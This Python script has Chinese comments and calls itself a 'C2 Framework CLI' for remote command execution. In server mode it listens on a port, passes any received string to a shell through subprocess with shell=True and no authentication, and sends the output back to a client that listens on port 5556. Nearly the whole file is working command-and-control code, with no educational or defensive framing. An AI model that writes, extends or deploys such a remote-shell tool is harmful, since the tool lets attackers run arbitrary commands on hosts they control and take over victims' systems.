import argparse
import time
import threading
from core.comms import SecureComm


# 启动客户端的函数
def run_client(host: str, port: int, command: str):
    comm = SecureComm(host, port, is_server=False)  # 服务端地址是 host 和 port
    print(f"Client: Sending command to {host}:{port}")
    comm.send_message(command.encode())  # 发送命令
    print("Client: Command sent!")

    # 让客户端在另一个端口监听（例如 5556），接收服务器返回的结果
    result = SecureComm("0.0.0.0", 5556, is_server=True).receive_message()  # 在本地 5556 端口接收结果
    print(f"Client: Command result: {result.decode()}")


# 启动服务器的函数
def run_server(host: str, port: int):
    comm = SecureComm(host, port, is_server=True)  # 监听端口
    print(f"Server: Waiting for command at {host}:{port}")

    # 接收客户端发送的命令
    command = comm.receive_message().decode()
    print(f"Server: Received command: {command}")

    # 执行命令并获取结果
    try:
        result = execute_command(command)
        comm.send_message(result)  # 将结果返回给客户端的另一个端口（例如 5556）
    except Exception as e:
        error_message = f"Error executing command: {str(e)}"
        comm.send_message(error_message.encode())  # 返回错误信息


# 执行命令的函数
def execute_command(command: str) -> bytes:
    """执行收到的命令并返回结果"""
    import subprocess
    try:
        result = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return result
    except subprocess.CalledProcessError as e:
        return e.output


# 设置 CLI 参数
def main():
    parser = argparse.ArgumentParser(description="C2 Framework CLI - Remote Command Execution")

    # 定义命令行选项
    subparsers = parser.add_subparsers(dest="mode", help="Mode of operation (client or server)")

    # 客户端模式
    client_parser = subparsers.add_parser("client", help="Run the client")
    client_parser.add_argument("--host", type=str, required=True, help="Server IP address")
    client_parser.add_argument("--port", type=int, required=True, help="Server port")
    client_parser.add_argument("--command", type=str, required=True, help="Command to execute on the server")

    # 服务器模式
    server_parser = subparsers.add_parser("server", help="Run the server")
    server_parser.add_argument("--host", type=str, required=True, help="Server IP address")
    server_parser.add_argument("--port", type=int, required=True, help="Port to listen on")

    args = parser.parse_args()

    if args.mode == "client":
        # 在客户端模式下运行
        run_client(args.host, args.port, args.command)
    elif args.mode == "server":
        # 在服务器模式下运行
        run_server(args.host, args.port)
    else:
        print("Invalid mode. Please choose 'client' or 'server'.")
        parser.print_help()


if __name__ == "__main__":
    main()
